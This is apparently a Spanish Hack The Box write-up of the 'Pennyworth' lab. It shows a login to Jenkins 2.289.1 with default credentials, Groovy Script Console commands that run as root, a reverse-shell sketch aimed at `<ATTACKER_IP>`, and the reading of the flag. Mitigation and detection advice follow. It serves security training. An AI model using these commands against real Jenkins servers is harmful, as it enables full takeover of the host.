---
machine: Pennyworth
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [jenkins, default-credentials, groovy, rce, tier1]
---

# Pennyworth — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

**Jenkins 2.289.1** en **8080/tcp** con credenciales por defecto `root:password`. La **Script Console** ejecuta Groovy sin restricciones y el proceso corre como **root**: una línea de Groovy da shell y la flag está en `/root/flag.txt`.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
```

- Un único servicio: Jenkins sobre Jetty.
- Sin SSH. La web es todo el objetivo.

```bash
curl -s -I http://<TARGET_IP>:8080/
```

```text
X-Jenkins: 2.289.1
```

La cabecera `X-Jenkins` confirma la versión exacta: 2.289.1 (2021, sin los parches posteriores).

## Enumeración

- `/login` es el formulario de acceso.
- `/script` es la Script Console, accesible solo con sesión de administrador.
- `/asynchPeople/` y `/securityRealm/` confirman que la seguridad está activada con base de datos interna.
- No hay registro público: la única vía es autenticarse.

Se prueban credenciales por defecto:

```text
usuario:  root
contraseña: password
```

```bash
curl -s -c cookies.txt -X POST http://<TARGET_IP>:8080/j_spring_security_check \
  -d "j_username=root&j_password=<PASSWORD>&from=/"
```

```text
302 → /   (sesión válida)
```

## Foothold

Con sesión de administrador, la Script Console ejecuta Groovy en la JVM del controlador, que corre como `root`:

```groovy
def p = ['/bin/bash','-c','id'].execute()
println p.text
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Reverse shell equivalente:

```groovy
String host = "<ATTACKER_IP>"
int port = 4444
String cmd = "/bin/bash"
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
// conectar los streams del proceso al socket y bombear datos
```

O directamente la flag:

```groovy
println ['/bin/bash','-c','cat /root/flag.txt'].execute().text
```

## Movimiento lateral

- No aplica: Jenkins es el único servicio y el proceso ya es root.
- Con más nodos (*agents*), la Script Console permitiría ejecutar en ellos.

## Escalada de privilegios

- No aplica: no hay escalada, el servicio nace como root.
- El fallo real es la combinación **credenciales por defecto + consola de scripts expuesta**.

## Evidencia

- Cabecera `X-Jenkins: 2.289.1`.
- Salida de `id` como root y flag redactada.

## Lecciones aprendidas

- `X-Jenkins` da la versión sin necesidad de autenticarse.
- Jenkins con credenciales por defecto es ejecución remota de código por diseño: la Script Console no es un extra, es una shell.
- Un servicio CI/CD suele tener acceso a credenciales de despliegue: en una red real sería el siguiente objetivo.
- Ejecutar Jenkins como root convierte un panel en compromiso total del host.

## Mitigaciones y detección

**Cómo se corrige:**

- Cambiar las credenciales iniciales y exigir MFA/SSO.
- Restringir `/script` y `/manage` a administradores nominales; deshabilitar la consola si no se usa.
- Ejecutar Jenkins con un usuario sin privilegios y en un contenedor aislado.
- Actualizar a una versión soportada y limitar la exposición a la VPN.

**Cómo se detectaría:**

- Logins correctos con `root` desde IPs externas.
- Peticiones a `/script` o `/scriptText` con contenido Groovy.
- Procesos `bash`/`sh` hijos del proceso Java de Jenkins.

- CWE-1392: Use of Default Credentials
- CWE-94: Improper Control of Generation of Code
- MITRE ATT&CK: [T1078.001](https://attack.mitre.org/techniques/T1078/001/), [T1059.004 Unix Shell](https://attack.mitre.org/techniques/T1059/004/)

## Referencias

- [Jenkins — Securing Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/)
- [Jenkins — Script Console](https://www.jenkins.io/doc/book/managing/script-console/)
